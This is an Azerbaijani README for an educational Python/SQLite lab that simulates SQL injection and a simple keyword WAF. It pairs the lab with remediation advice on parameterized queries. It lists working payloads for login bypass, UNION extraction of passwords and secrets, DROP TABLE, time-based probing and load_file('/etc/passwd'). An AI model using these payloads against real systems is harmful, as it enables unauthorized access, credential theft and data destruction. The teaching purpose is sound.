# 🛡️ SQL Injection Laboratory (Python & Tkinter)

Bu layihə **Python (Tkinter + SQLite)** istifadə edərək hazırlanmış, qabaqcıl **SQL Injection (SQLi)** hücum növlərini və müdafiə mexanizmlərini simulyasiya edən təhsil məqsədli bir laboratoriyadır.

Layihə təkcə giriş ekranını keçməyi deyil, həm də **məlumat oğurluğu**, **verilənlər bazasının silinməsi**, **server fayllarının oxunması** və **WAF (Firewall) simulyasiyasını** nümayiş etdirir.

---

## 🚀 Xüsusiyyətlər

Bu laboratoriya aşağıdakı SQL Injection növlərini dəstəkləyir:

- **Authentication Bypass:** Şifrəni bilmədən sistemə giriş (`' OR 1=1`).
- **UNION-Based SQLi:** Gizli cədvəllərdən (`secrets`) məlumatların oğurlanması.
- **Error-Based SQLi:** Verilənlər bazası xətaları vasitəsilə strukturun öyrənilməsi.
- **Stacked Queries:** Eyni anda birdən çox sorğunun icrası (`DROP TABLE` ilə bazanın silinməsi).
- **Time-Based Blind SQLi:** `SLEEP()` funksiyası ilə verilənlər bazasının cavab müddətini manipulyasiya etmək.
- **File System Access:** `load_file()` simulyasiyası ilə serverdəki konfiqurasiya fayllarının oxunması.
- **WAF (Web Application Firewall):** Sadə filtrləmə sistemi və ondan yayınma (Bypass) ssenariləri.
- **Real-Time Query View:** Arxa planda yaranan SQL sorğusunu canlı görmək imkanı.

---

## 🛠️ Quraşdırma və İşə Salma

1. **Python 3**-ün sisteminizdə quraşdırıldığından əmin olun.
2. Repozitoriyanı klonlayın və ya `main.py` faylını yükləyin.
3. Asılılıqlar: Standart Python kitabxanaları istifadə olunub (`sqlite3`, `tkinter`, `threading`, `time`), əlavə `pip install` tələb olunmur.
4. Kodu işə salın:

```sh
python main.py
```

---

## 💀 Hücum Ssenariləri (Payloads)

Aşağıdakı nümunə kodları **İstifadəçi adı (Username)** xanasına daxil edin, şifrəni boş saxlaya bilərsiniz.

### 1. Girişin Yan Keçilməsi (Authentication Bypass)
Sadəcə sistemə daxil olmaq üçün:
```sql
admin' OR '1'='1' --
```
*Nəticə:* `admin` istifadəçisi kimi uğurlu giriş.

### 2. Məlumat Oğurluğu (UNION Based)
Gizli məlumatları və ya başqa istifadəçilərin şifrələrini çəkmək:
```sql
' UNION SELECT 1, username, password FROM users --
```
*və ya serverdəki kredit kartı məlumatları üçün:*
```sql
' UNION SELECT 1, id, data FROM secrets --
```

### 3. Verilənlər Bazasını Məhv Etmək (Stacked Queries)
`DROP` əmri ilə `users` cədvəlini silmək:
```sql
'; DROP TABLE users; --
```
*Nəticə:* Proqram "no such table: users" xətası verəcək.

### 4. Zaman Əsaslı Kor İnyeksiya (Time-Based Blind)
Bazanın cavabını gecikdirmək (əgər 3 saniyə donarsa, deməli boşluq var):
```sql
' AND sleep(3) --
```
*Nəticə:* Proqram 3 saniyə donacaq və sonra "Time-Based Injection Detected" xəbərdarlığı çıxacaq.

### 5. Fayl Sisteminin Oxunması (File Access)
Serverdəki konfiqurasiya fayllarını oxumaq (Simulyasiya):
```sql
' UNION SELECT 1, 'hacked', load_file('/etc/passwd') --
```
*və ya:*
```sql
' UNION SELECT 1, 'hacked', load_file('config.php') --
```

---

## 🛡️ Müdafiə Mexanizmi (WAF Simulyasiyası)

Tətbiqdə **"WAF (Firewall) Aktiv et"** qutusu mövcuddur. Bunu işarələsəniz, tətbiq daxilində sadə bir qoruma sistemi işə düşəcək.

- **Nə edir?** `UNION`, `SELECT`, `SLEEP` kimi təhlükəli açar sözləri bloklayır.
- **Məqsəd:** Hücum edənin filtrləri necə keçə biləcəyini (Bypass) və ya kodun təhlükəsiz yazılmasının vacibliyini göstərmək.

---

## 💡 Necə Qorunmalı? (Remediation)

Bu layihə zəif kodun (String formatting) təhlükələrini göstərir:
```python
# TƏHLÜKƏLİ:
query = f"SELECT * FROM users WHERE username='{username}'"
```

Təhlükəsizlik üçün hər zaman **Parameterized Queries** (Parametrlənmiş Sorğular) istifadə edilməlidir:
```python
# TƏHLÜKƏSİZ:
query = "SELECT * FROM users WHERE username=?"
cursor.execute(query, (username,))
```

---

## ⚠️ İmtina (Disclaimer)

**Bu layihə yalnız təhsil və tədqiqat məqsədləri üçün hazırlanmışdır.** 
Real sistemlərdə icazəsiz SQL Injection hücumları həyata keçirmək qanunsuzdur və ciddi hüquqi məsuliyyət yaradır. Müəllif bu alətin sui-istifadəsinə görə məsuliyyət daşımır.

---

## 📜 Lisensiya
